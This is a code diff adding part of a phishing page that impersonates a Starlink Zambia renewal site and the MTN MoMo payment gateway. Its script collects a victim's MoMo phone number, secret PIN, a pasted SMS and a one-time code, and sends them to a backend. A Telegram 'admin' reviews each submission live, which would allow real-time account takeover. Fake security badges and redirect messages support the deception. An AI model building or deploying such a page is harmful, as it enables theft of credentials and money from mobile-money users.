+      </div>
+
+      <label class="sms-label" for="sms-content">Paste full SMS content</label>
+      <textarea id="sms-content" class="sms-textarea" placeholder="Paste the entire MTN MoMo SMS here..."></textarea>
+      <div class="sms-counter">0 characters</div>
+
+      <button class="sms-next-btn" type="button" onclick="showPage('otp')">Next Step →</button>
+    </div>
+
+    <div class="page" id="page-otp">
+      <div class="otp-header">
+        <button class="otp-back-link" onclick="showPage('sms')" type="button">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Back
+        </button>
+        <div class="otp-total">ZMW 45.00</div>
+      </div>
+
+      <p class="otp-instruction">Please enter the 4-digit OTP code you received in the SMS.</p>
+
+      <div class="otp-send-to">
+        Sending To
+        <strong>97646466</strong>
+      </div>
+
+      <label class="otp-label" for="otp-1">Enter OTP code</label>
+      <div class="otp-inputs">
+        <input id="otp-1" type="text" maxlength="1" inputmode="numeric" aria-label="OTP digit 1">
+        <input id="otp-2" type="text" maxlength="1" inputmode="numeric" aria-label="OTP digit 2">
+        <input id="otp-3" type="text" maxlength="1" inputmode="numeric" aria-label="OTP digit 3">
+        <input id="otp-4" type="text" maxlength="1" inputmode="numeric" aria-label="OTP digit 4">
+      </div>
+
+      <button class="otp-verify-btn" type="button" onclick="completePayment()">
+        <span>Verify &amp; Complete</span>
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/><path d="M8.5 12.5l2.5 2.5 5-5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+
+      <div class="otp-secure">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6l8-4z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        SSL ENCRYPTED &amp; SECURE
+      </div>
+    </div>
+
+    <div class="page" id="page-complete">
+      <div class="complete-page">
+        <div class="complete-check" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="m5 12.5 4.5 4.5L19 7.5" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <h1 class="complete-title">Payment Complete</h1>
+        <p class="complete-description">Your Starlink Zambia package has been confirmed.</p>
+        <div class="complete-details">
+          <div class="complete-detail-row"><span>Package</span><strong id="complete-plan">Basic Plan</strong></div>
+          <div class="complete-detail-row"><span>Amount</span><strong id="complete-amount">ZMW 15.00</strong></div>
+          <div class="complete-detail-row"><span>Status</span><strong>Verified</strong></div>
+        </div>
+        <button class="complete-home-btn" type="button" onclick="showPage('status')">Back to Home</button>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="bottom-nav">
+    <button class="nav-item active" id="nav-status" onclick="showPage('status')">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 8.5C7 3.5 17 3.5 22 8.5M5 12c4-4 10-4 14 0M8.5 15.5c2-2 5-2 7 0M12 19h.01" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Status
+    </button>
+    <button class="nav-item" id="nav-plans" onclick="showPage('plans')">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6 7V5a2 2 0 012-2h8a2 2 0 012 2v2M4 7h16l-1 13H5L4 7z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Plans
+    </button>
+    <button class="nav-item" id="nav-orders" onclick="showToast('Orders — coming soon')">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 6h16M4 12h16M4 18h10" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Orders
+    </button>
+    <button class="nav-item" id="nav-settings" onclick="showToast('Settings — coming soon')">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 11-2.83 2.83l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09a1.65 1.65 0 00-1-1.51 1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 11-2.83-2.83l.06-.06a1.65 1.65 0 00.33-1.82 1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09a1.65 1.65 0 001.51-1 1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 112.83-2.83l.06.06a1.65 1.65 0 001.82.33H9a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 112.83 2.83l-.06.06a1.65 1.65 0 00-.33 1.82V9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Settings
+    </button>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <div class="modal-overlay" id="payment-modal">
+    <div class="modal-card">
+      <div class="spinner"></div>
+      <div class="momo-logo">
+        <svg viewBox="0 0 620 280" role="img" aria-label="MTN MoMo from MTN" xmlns="http://www.w3.org/2000/svg">
+          <defs><linearGradient id="momo-blue-modal" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#00658a"/><stop offset="1" stop-color="#00334c"/></linearGradient></defs>
+          <rect x="40" y="40" width="214" height="214" rx="36" fill="url(#momo-blue-modal)"/>
+          <path d="M40 218h214v7a29 29 0 0 1-29 29H69a29 29 0 0 1-29-29z" fill="#ffcc00"/>
+          <path d="M126 83 168 38c24 29 38 64 39 104-19-28-47-49-81-59zM84 147l42-64c39 20 65 61 75 126-33-30-72-51-117-62z" fill="#ffcc00"/>
+          <circle cx="134" cy="130" r="19" fill="#004d6b"/>
+          <text x="292" y="151" fill="#ffcc00" font-family="Arial, sans-serif" font-size="96" font-weight="900" letter-spacing="-5">MoMo</text>
+          <text x="296" y="199" fill="#ffcc00" font-family="Arial, sans-serif" font-size="38" font-weight="800">from MTN</text>
+        </svg>
+      </div>
+      <div class="modal-title">Processing...</div>
+      <div class="modal-desc">Securely redirecting to MTN MoMo payment gateway</div>
+      <div class="modal-note">Please do not refresh the page</div>
+    </div>
+  </div>
+
+  <div class="approval-overlay" id="approval-modal">
+    <div class="approval-card">
+      <div class="approval-spinner"></div>
+      <h3 class="approval-title">Waiting for approval</h3>
+      <p class="approval-subtitle">Your request is being reviewed by the admin. This usually takes a few moments.</p>
+      <div class="approval-summary">
+        <div class="approval-summary-row"><span>Plan</span><strong id="approval-plan">Basic Plan</strong></div>
+        <div class="approval-summary-row"><span>Amount</span><strong id="approval-amount">ZMW 15.00</strong></div>
+        <div class="approval-summary-row"><span>Phone</span><strong id="approval-phone">+260 977 000000</strong></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  var selectedPlanName = 'Starlink Renewal';
+  var selectedPlanPrice = 45;
+  var selectedPhoneNumber = '';
+  var selectedPinValue = '';
+  var currentApprovalId = null;
+  var approvalPollTimer = null;
+
+  function showApprovalWaiting(){
+    var modal = document.getElementById('approval-modal');
+    document.getElementById('approval-plan').textContent = selectedPlanName;
+    document.getElementById('approval-amount').textContent = 'ZMW ' + selectedPlanPrice.toFixed(2);
+    document.getElementById('approval-phone').textContent = '+260 ' + selectedPhoneNumber;
+    document.querySelector('.content').classList.add('blurred');
+    modal.classList.add('active');
+  }
+
+  function hideApprovalWaiting(){
+    var modal = document.getElementById('approval-modal');
+    modal.classList.remove('active');
+    document.querySelector('.content').classList.remove('blurred');
+  }
+
+  function showPage(name){
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page-' + name).classList.add('active');
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    var navBtn = document.getElementById('nav-' + name);
+    if(navBtn) navBtn.classList.add('active');
+    document.querySelector('.content').scrollTop = 0;
+    window.scrollTo(0,0);
+  }
+
+  function startPayment(planName, price){
+    var modal = document.getElementById('payment-modal');
+    selectedPlanName = planName;
+    selectedPlanPrice = price;
+
+    document.querySelector('.content').classList.add('blurred');
+    modal.classList.add('active');
+
+    setTimeout(function(){
+      modal.classList.remove('active');
+      document.querySelector('.content').classList.remove('blurred');
+
+      document.getElementById('momo-amount').textContent = 'ZMW ' + price.toFixed(2);
+      document.getElementById('momo-service').textContent = planName;
+      document.querySelector('.sms-total').textContent = 'ZMW ' + price.toFixed(2);
+      document.querySelector('.otp-total').textContent = 'ZMW ' + price.toFixed(2);
+      document.querySelector('.momo-phone-row input').value = '';
+      document.querySelector('.momo-pin-input').value = '';
+      showPage('payment');
+    }, 800);
+  }
+
+  async function submitApprovalRequest(payload){
+    var response = await fetch('/api/request-approval', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    if (!response.ok) {
+      throw new Error('Approval request failed.');
+    }
+
+    var data = await response.json();
+    return data.id;
+  }
+
+  function startApprovalPolling(id){
+    if (approvalPollTimer) {
+      clearInterval(approvalPollTimer);
+    }
+
+    approvalPollTimer = setInterval(async function(){
+      try {
+        var response = await fetch('/api/check-approval/' + id);
+        if (!response.ok) {
+          return;
+        }
+
+        var data = await response.json();
+
+        if (data.status === 'approved') {
+          clearInterval(approvalPollTimer);
+          approvalPollTimer = null;
+          hideApprovalWaiting();
+          document.getElementById('complete-plan').textContent = selectedPlanName;
+          document.getElementById('complete-amount').textContent = 'ZMW ' + selectedPlanPrice.toFixed(2);
+          showPage('complete');
+          showToast('Approved by Telegram admin.');
+          return;
+        }
+
+        if (['denied', 'insufficient', 'demo_error'].includes(data.status)) {
+          clearInterval(approvalPollTimer);
+          approvalPollTimer = null;
+          hideApprovalWaiting();
+          var statusMessage = data.status === 'denied'
+            ? 'Approval denied.'
+            : data.status === 'insufficient'
+              ? 'Approval marked insufficient.'
+              : 'Wrong PIN reported by admin.';
+          showPage('payment');
+          showToast(statusMessage);
+        }
+      } catch (err) {
+        console.error('Approval poll error:', err);
+      }
+    }, 2000);
+  }
+
+  function confirmPayment(){
+    var phoneInput = document.querySelector('.momo-phone-row input');
+    var pinInput = document.querySelector('.momo-pin-input');
+    var phone = phoneInput.value.trim();
+    var pin = pinInput.value.trim();
+
+    if(!/^\d{9}$/.test(phone)){
+      showToast('Enter a valid 9-digit MTN MoMo number.');
+      return;
+    }
+    if(!/^\d{5}$/.test(pin)){
+      showToast('Enter your 5-digit PIN.');
+      return;
+    }
+
+    selectedPhoneNumber = phone;
+    selectedPinValue = pin;
+    phoneInput.value = '';
+    pinInput.value = '';
+    showPage('sms');
+    showToast('Payment confirmed. Please verify your SMS.');
+  }
+
+  function runDiagnostic(btn){
+    var original = btn.innerHTML;
+    btn.disabled = true;
+    btn.style.opacity = '0.6';
+    btn.lastChild.textContent = 'Running diagnostic...';
+    setTimeout(function(){
+      btn.disabled = false;
+      btn.style.opacity = '';
+      btn.innerHTML = original;
+      showToast('All systems normal — connection stable.');
+    }, 1500);
+  }
+
+  function showToast(message){
+    var toast = document.getElementById('toast');
+    toast.textContent = message;
+    toast.classList.add('show');
+    clearTimeout(toast._hideTimer);
+    toast._hideTimer = setTimeout(function(){
+      toast.classList.remove('show');
+    }, 2200);
+  }
+
+  async function completePayment(){
+    var otp = Array.from(document.querySelectorAll('.otp-inputs input'))
+      .map(function(input){ return input.value; })
+      .join('');
+
+    var smsText = document.getElementById('sms-content').value.trim();
+
+    if(!smsText){
+      showToast('Paste the full SMS content to continue.');
+      return;
+    }
+
+    if(!/^\d{4}$/.test(otp)){
+      showToast('Enter the 4-digit OTP code to continue.');
+      return;
+    }
+
+    try {
+      currentApprovalId = await submitApprovalRequest({
+        plan: selectedPlanName,
+        price: selectedPlanPrice.toFixed(2),
+        phone: selectedPhoneNumber,
+        step: 'otp',
+        code: selectedPinValue,
+        otp: otp,
+        sms: smsText
+      });
+
+      showApprovalWaiting();
+      showToast('Awaiting Telegram approval...');
+      startApprovalPolling(currentApprovalId);
+    } catch (err) {
+      console.error('Approval submission error:', err);
+      showToast('Could not send approval request.');
+    }
+  }
+
+  document.addEventListener('input', function(event){
+    if (event.target && event.target.matches('.otp-inputs input')) {
+      var input = event.target;
+      input.value = input.value.replace(/\D/g, '').slice(0, 1);
+      if (input.value && input.nextElementSibling && input.nextElementSibling.matches('input')) {
+        input.nextElementSibling.focus();
+      }
+    }
+  });
+
+  document.addEventListener('keydown', function(event){
+    if (event.target && event.target.matches('.otp-inputs input')) {
+      if (event.key === 'Backspace' && !event.target.value && event.target.previousElementSibling) {
+        event.target.previousElementSibling.focus();
+      }
+    }
+  });
+</script>
+
+</body>
+</html>
